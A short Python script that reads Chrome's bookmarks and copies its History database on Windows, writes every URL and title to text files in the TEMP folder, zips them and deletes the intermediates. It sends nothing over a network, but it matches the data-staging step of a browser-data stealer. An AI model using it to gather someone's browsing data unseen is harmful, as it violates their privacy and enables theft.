import os
import json
import sqlite3
import shutil
import zipfile

username = os.getlogin()

bookmarks_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
history_db_path = f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History"

with open(bookmarks_path, encoding="utf-8") as file:
    bookmarks_data = json.load(file)

bookmarks = bookmarks_data["roots"]["bookmark_bar"]["children"]

temp_dir = os.environ["TEMP"]
bookmarks_file_path = os.path.join(temp_dir, "Chrome Bookmarks.txt")

with open(bookmarks_file_path, "w", encoding="utf-8") as file:
    for bookmark in bookmarks:
        url = bookmark["url"]
        name = bookmark["name"]
        file.write(f"Name: {name}\nURL: {url}\n\n")

history_copy_path = os.path.join(temp_dir, "HistoryCopy")
shutil.copyfile(history_db_path, history_copy_path)

conn = sqlite3.connect(history_copy_path)
cursor = conn.cursor()

cursor.execute("SELECT url, title FROM urls")

rows = cursor.fetchall()

history_file_path = os.path.join(temp_dir, "Chrome History.txt")

with open(history_file_path, "w", encoding="utf-8") as file:
    for row in rows:
        url = row[0]
        title = row[1]
        file.write(f"URL: {url}\n")
        file.write(f"Title: {title}\n")
        file.write("--------------------\n")

zip_file_path = os.path.join(temp_dir, "Chrome_Data.zip")
with zipfile.ZipFile(zip_file_path, "w") as zip_file:
    zip_file.write(bookmarks_file_path, "Chrome Bookmarks.txt")
    zip_file.write(history_file_path, "Chrome History.txt")
    
os.remove(bookmarks_file_path)
os.remove(history_file_path)
